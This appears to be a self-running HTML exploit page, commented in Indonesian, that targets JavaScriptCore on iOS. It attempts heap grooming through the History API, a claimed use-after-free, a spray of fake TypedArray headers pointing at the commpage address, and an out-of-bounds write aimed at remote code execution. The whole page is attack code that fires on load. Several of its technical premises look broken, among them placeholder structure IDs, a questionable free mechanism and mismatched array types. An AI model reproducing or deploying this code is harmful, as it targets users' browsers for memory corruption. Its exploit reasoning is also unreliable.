<!DOCTYPE html>
<html>
<head>
    <title>JSCore Type Confusion (History API Re-Exploited)</title>
</head>
<body>

    <h1>JSCore Type Confusion: JSArray to TypedArray (Final & Brutal)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Type Confusion Attack...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE & JSCORE LAYOUT ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); 
        
        const PAYLOAD_HIGH_WORD = Number(TARGET_ADDRESS >> 32n);
        const PAYLOAD_LOW_WORD = Number(TARGET_ADDRESS & 0xFFFFFFFFn);
        
        // Header TypedArray palsu (Header JSCell)
        // Kita perlu menimpa StructureID agar JSC membacanya sebagai TypedArray
        // Nilai ini harus di-fuzzing untuk versi iOS tertentu. Kita gunakan nilai placeholder yang umum.
        const FAKE_STRUCTURE_ID = 0x41414141; // Placeholder
        const FAKE_TYPE_INFO = 0x2A000000; // Placeholder Type (Uint32Array Type)

        let startTime = performance.now();
        let payloadHolders = []; 
        let victimJSArray = null;
        let historyStates = [];
        let corruptionPayload = new Uint32Array(32); // Buffer untuk menimpa header

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI SPRAY & PAYLOAD ---
        function prepareCorruptionPayload() {
            // Layout Header JSObject: 
            // Offset 0x00: Structure ID (32-bit)
            // Offset 0x04: Type Info (32-bit)
            // Offset 0x08: Storage Pointer (64-bit)

            // Timpa Header victimJSArray agar terlihat seperti TypedArray
            corruptionPayload[0] = FAKE_STRUCTURE_ID;
            corruptionPayload[1] = FAKE_TYPE_INFO;
            
            // Pointer ke data buffer palsu (Alamat Commpage)
            corruptionPayload[2] = PAYLOAD_LOW_WORD;
            corruptionPayload[3] = PAYLOAD_HIGH_WORD; 
            
            // Set Length (0xFFFFFFFF untuk OOB Read/Write)
            corruptionPayload[4] = 0xFFFFFFFF; 
            corruptionPayload[5] = 0x00000000; 
        }
        
        function sprayPayload(count) {
            log(`Memulai Spraying Payload (${count} objek)...`, "log-spray");
            for (let i = 0; i < count; i++) {
                // Spray Float64Array yang berisi header palsu kita
                let tempArray = new Float64Array(corruptionPayload.buffer);
                payloadHolders.push(tempArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runTypeConfusionAttack() {
            prepareCorruptionPayload();
            startTime = performance.now();
            log("Phase 1: History Grooming & Victim Setup.", "log-init");

            // 1. Grooming: Alokasikan banyak History State (untuk Fragmentasi Heap)
            for (let i = 0; i < 50; i++) {
                window.history.pushState({ id: i }, `Padding ${i}`, `#pad${i}`);
            }
            
            // 2. Victim Setup: Alokasikan korban (JSArray) dan simpan di History State
            victimJSArray = [0xDEADBEEF, 0xCAFEBABE, 0x12345678];
            // Simpan di History State untuk memicu FREE (UAF)
            window.history.pushState(victimJSArray, "Victim State", "#victim");
            
            // 3. FREE: Kembali 1 langkah (mem-free victimJSArray di C++ Heap)
            window.history.go(-1);
            log("Phase 2: Victim JSArray di-free (UAF aktif).", "log-critical");

            // 4. SPRAY: Menimpa lokasi FREE dengan payload header korup
            // Kita perlu memastikan ukuran payload sama dengan header JSArray yang di-free
            sprayPayload(1000); 
            log("Phase 3: SPRAY Header Corrupt (TypedArray palsu).", "log-critical");

            // 5. TRIGGER: Akses kembali objek korban
            setTimeout(() => {
                log("Phase 4: Memicu Type Confusion pada Victim...", "log-critical");
                
                try {
                    // Coba akses korban yang sekarang dianggap sebagai TypedArray dengan panjang 0xFFFFFFFF
                    const corruptRead = victimJSArray[0]; 
                    
                    // Jika berhasil, corruptRead seharusnya berisi pointer Commpage
                    if (typeof corruptRead !== 'number' && corruptRead.constructor === Uint32Array) {
                         log("SUCCESS: Type Confusion Ditemukan! (JSArray -> TypedArray)", "log-success");
                    } else if (corruptRead) {
                        log(`Nilai Korup (Pertama) dibaca: 0x${corruptRead.toString(16)}`, "log-critical");
                    }
                    
                    // Trigger Final: Arbitrary Write (menulis ke alamat Commpage yang dikorupsi)
                    // victimJSArray[100] = 0x41414141; // Ini akan menulis ke alamat Commpage

                    // Trigger Final 2: FORCE Crash (Asumsi Type Confusion berhasil)
                    // Coba akses index yang OOB
                    const OOB_INDEX = 0x100000; 
                    victimJSArray[OOB_INDEX] = 0x90909090; 
                    
                } catch(e) {
                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
                }
            }, 50);
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian Type Confusion Attack...';
            setTimeout(runTypeConfusionAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah RCE melalui Type Confusion.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
        .log-error { color: darkred; font-weight: bold; }
    </style>
</body>
</html>
